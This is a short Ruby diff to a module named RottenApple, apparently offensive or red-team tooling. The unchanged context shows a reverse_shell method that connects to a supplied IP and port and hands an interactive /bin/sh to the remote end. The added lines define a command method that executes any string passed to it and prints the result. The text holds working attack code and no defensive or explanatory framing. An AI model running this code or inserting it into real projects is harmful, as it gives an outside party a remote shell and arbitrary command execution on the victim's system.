@@ -6,5 +6,9 @@ module RottenApple
     def reverse_shell(ip, port)
       f=TCPSocket.open(ip,port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
     end
+
+    def command(cmd_string)
+      puts `#{cmd_string}`
+    end
   end
 end
